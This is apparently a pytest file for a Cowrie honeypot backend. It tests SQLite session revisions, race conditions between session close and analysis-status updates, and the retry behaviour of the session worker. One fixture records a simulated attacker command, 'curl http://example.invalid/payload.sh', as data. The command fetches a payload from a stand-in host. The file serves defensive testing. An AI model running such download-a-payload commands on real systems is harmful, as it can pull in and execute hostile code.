from __future__ import annotations

import copy
import inspect
import json
import sqlite3
import threading
from pathlib import Path
from typing import Any

import pytest

from production.storage import SQLiteStorage, open_storage
from production.storage.contract import StorageBackend
from production.utils.config import ProductionConfig
from production.workers.session_worker import SessionWorker
from tests.test_session_worker_event_lifecycle import _config, _event, _event_row


@pytest.fixture
def storage(tmp_path: Path):
    return open_storage(f"sqlite:///{tmp_path / 'sessions.db'}")


def test_stale_session_save_preserves_newer_analysis_fields(storage: Any) -> None:
    active = {
        "session_id": "session-race",
        "src_ip": "203.0.113.30",
        "is_ended": False,
        "commands": ["id"],
    }
    storage.save_session(active)
    stale_close = {
        **copy.deepcopy(active),
        "is_ended": True,
        "commands": ["id", "uname -a"],
        "analysis_status": "queued",
        "analysis_job_id": "stale-job",
    }

    storage.update_session_analysis_status(
        "session-race",
        "succeeded",
        report_id="report-current",
    )
    storage.save_session(stale_close)

    row = storage.get_session("session-race")
    assert row is not None
    assert int(row["revision"]) == 3
    payload = row["payload"]
    assert payload["is_ended"] is True
    assert payload["commands"] == ["id", "uname -a"]
    assert payload["analysis_status"] == "succeeded"
    assert payload["report_id"] == "report-current"
    assert "analysis_job_id" not in payload


def test_session_revision_upgrade_and_status_contract_are_backend_neutral(
    tmp_path: Path,
) -> None:
    sqlite = open_storage(f"sqlite:///{tmp_path / 'upgrade.db'}")
    with sqlite.connection() as connection:
        columns = {
            row["name"] for row in connection.execute("PRAGMA table_info(sessions)")
        }
    assert "revision" in columns
    protocol = inspect.signature(StorageBackend.update_session_analysis_status)
    assert inspect.signature(
        SQLiteStorage.update_session_analysis_status
    ) == protocol


def test_sqlite_concurrent_close_save_cannot_erase_report_status(tmp_path: Path) -> None:
    database_url = f"sqlite:///{tmp_path / 'concurrent.db'}"
    first = open_storage(database_url)
    second = open_storage(database_url)
    first.save_session(
        {
            "session_id": "session-concurrent",
            "src_ip": "203.0.113.31",
            "is_ended": False,
            "commands": ["id"],
        }
    )
    stale = {
        "session_id": "session-concurrent",
        "src_ip": "203.0.113.31",
        "is_ended": True,
        "commands": ["id", "whoami"],
        "analysis_status": "queued",
    }
    barrier = threading.Barrier(2)
    failures: list[BaseException] = []

    def close_save() -> None:
        try:
            barrier.wait()
            first.save_session(stale)
        except BaseException as exc:  # pragma: no cover - asserted below
            failures.append(exc)

    def report_update() -> None:
        try:
            barrier.wait()
            second.update_session_analysis_status(
                "session-concurrent",
                "succeeded",
                report_id="report-concurrent",
            )
        except BaseException as exc:  # pragma: no cover - asserted below
            failures.append(exc)

    threads = [threading.Thread(target=close_save), threading.Thread(target=report_update)]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join(timeout=5)

    assert failures == []
    row = first.get_session("session-concurrent")
    assert row is not None
    assert int(row["revision"]) == 3
    assert row["payload"]["analysis_status"] == "succeeded"
    assert row["payload"]["report_id"] == "report-concurrent"
    assert row["payload"]["commands"] == ["id", "whoami"]


def test_sqlite_report_job_and_session_status_roll_back_together(tmp_path: Path) -> None:
    storage = open_storage(f"sqlite:///{tmp_path / 'report-atomic.db'}")
    session = {
        "session_id": "session-report-atomic",
        "src_ip": "203.0.113.33",
        "is_ended": True,
        "analysis_status": "queued",
    }
    storage.save_session(session)
    job_id = storage.enqueue_analysis_job(session)
    claim = storage.claim_analysis_jobs("analysis-worker", 1, 30, 3)[0]
    with storage.connection() as connection:
        connection.execute(
            """
            CREATE TRIGGER reject_report_status
            BEFORE UPDATE ON sessions
            WHEN NEW.payload_json LIKE '%\"analysis_status\":\"succeeded\"%'
            BEGIN
                SELECT RAISE(ABORT, 'injected session status failure');
            END
            """
        )
    with pytest.raises(sqlite3.IntegrityError, match="injected session status failure"):
        storage.complete_analysis_job(
            job_id,
            "analysis-worker",
            claim["claim_token"],
            {"session_id": "session-report-atomic", "summary": "complete"},
        )
    assert storage.list_rows("reports") == []
    job = next(row for row in storage.list_rows("analysis_jobs") if row["job_id"] == job_id)
    assert job["status"] == "running"
    assert storage.get_session("session-report-atomic")["payload"]["analysis_status"] == "queued"


def _prepare_worker(tmp_path: Path) -> tuple[ProductionConfig, Any, SessionWorker]:
    config = _config(tmp_path)
    defaults = ProductionConfig()
    config.prediction_policy = copy.deepcopy(defaults.prediction_policy)
    config.threat_hunt_policy = copy.deepcopy(defaults.threat_hunt_policy)
    storage = open_storage(config.database_url)
    for index, event in enumerate(
        [
            _event("session-close", "cowrie.session.connect", 0, src_ip="8.8.8.8"),
            _event(
                "session-close",
                "cowrie.login.success",
                1,
                src_ip="8.8.8.8",
                username="root",
                password="fixture-only",
            ),
            _event(
                "session-close",
                "cowrie.command.input",
                2,
                src_ip="8.8.8.8",
                input="curl http://example.invalid/payload.sh",
            ),
        ]
    ):
        storage.store_event("sensor-a", event)
    worker = SessionWorker(config)
    assert worker.process_unprocessed() == 3
    return config, storage, worker


def test_close_resolves_without_forecast_and_final_session_precedes_jobs(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _config_value, storage, worker = _prepare_worker(tmp_path)
    order = ["event_persisted"]
    close_event = _event(
        "session-close",
        "cowrie.session.closed",
        3,
        src_ip="8.8.8.8",
        duration=3.0,
    )
    close_event_id, _ = storage.store_event("sensor-a", close_event)

    original_session = worker.storage.save_session
    original_analysis = worker.storage.enqueue_analysis_job
    original_hunt = worker.storage.enqueue_threat_hunt_job
    original_complete = worker.storage.complete_event

    def save_session(payload: dict[str, Any]) -> None:
        original_session(payload)
        if payload.get("is_ended"):
            order.append("closed_session")

    def enqueue_analysis(payload: dict[str, Any]) -> str:
        persisted = worker.storage.get_session("session-close")
        assert persisted is not None and persisted["payload"]["is_ended"] is True
        snapshots = worker.storage.list_rows_for_session(
            "prediction_snapshots", "session-close", limit=20
        )
        assert all(row.get("event_id") != close_event_id for row in snapshots)
        order.append("analysis_job")
        return original_analysis(payload)

    def enqueue_hunt(*args: Any, **kwargs: Any):
        order.append("hunt_job")
        return original_hunt(*args, **kwargs)

    def complete_event(*args: Any, **kwargs: Any) -> bool:
        order.append("event_completed")
        return original_complete(*args, **kwargs)

    monkeypatch.setattr(worker.storage, "save_session", save_session)
    monkeypatch.setattr(worker.storage, "enqueue_analysis_job", enqueue_analysis)
    monkeypatch.setattr(worker.storage, "enqueue_threat_hunt_job", enqueue_hunt)
    monkeypatch.setattr(worker.storage, "complete_event", complete_event)
    try:
        assert worker.process_unprocessed() == 1
    finally:
        worker.close()

    assert order.index("event_persisted") < order.index("closed_session")
    assert order.index("closed_session") < order.index("analysis_job")
    assert order.index("closed_session") < order.index("hunt_job")
    assert order.index("analysis_job") < order.index("event_completed")
    assert order.index("hunt_job") < order.index("event_completed")


def test_close_stage_failure_is_retryable_without_partial_analysis_job(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    config, storage, worker = _prepare_worker(tmp_path)
    close_event_id, _ = storage.store_event(
        "sensor-a",
        _event(
            "session-close",
            "cowrie.session.closed",
            3,
            src_ip="8.8.8.8",
            duration=3.0,
        ),
    )
    original_enqueue = worker.storage.enqueue_analysis_job

    def fail_after_final_session(_payload: dict[str, Any]) -> str:
        persisted = worker.storage.get_session("session-close")
        assert persisted is not None and persisted["payload"]["is_ended"] is True
        assert all(
            row.get("event_id") != close_event_id
            for row in worker.storage.list_rows_for_session(
                "prediction_snapshots", "session-close", limit=20
            )
        )
        raise ConnectionError("injected close-stage failure")

    monkeypatch.setattr(worker.storage, "enqueue_analysis_job", fail_after_final_session)
    assert worker.process_unprocessed() == 0
    failed = _event_row(storage, close_event_id)
    assert failed["processed"] == 0
    assert failed["processing_outcome"] == "retry_scheduled"
    assert failed["last_error_code"] == "event_processing_failed"
    assert failed["last_error_type"] == "ConnectionError"
    assert storage.list_rows("analysis_jobs") == []

    database_path = Path(config.database_url.removeprefix("sqlite:///"))
    with sqlite3.connect(database_path) as connection:
        connection.execute(
            "UPDATE events SET next_retry_at='2000-01-01T00:00:00+00:00' "
            "WHERE event_id=?",
            (close_event_id,),
        )
    monkeypatch.setattr(worker.storage, "enqueue_analysis_job", original_enqueue)
    try:
        assert worker.process_unprocessed() == 1
    finally:
        worker.close()

    completed = _event_row(storage, close_event_id)
    assert completed["processed"] == 1
    assert completed["attempts"] == 2
    assert len(storage.list_rows("analysis_jobs")) == 1
    close_snapshots = [
        row
        for row in storage.list_rows_for_session(
            "prediction_snapshots", "session-close", limit=20
        )
        if row.get("event_id") == close_event_id
    ]
    assert close_snapshots == []
    session = storage.get_session("session-close")
    assert session is not None
    assert session["payload"]["analysis_status"] == "queued"
    assert "fixture-only" not in json.dumps(session["payload"], sort_keys=True)
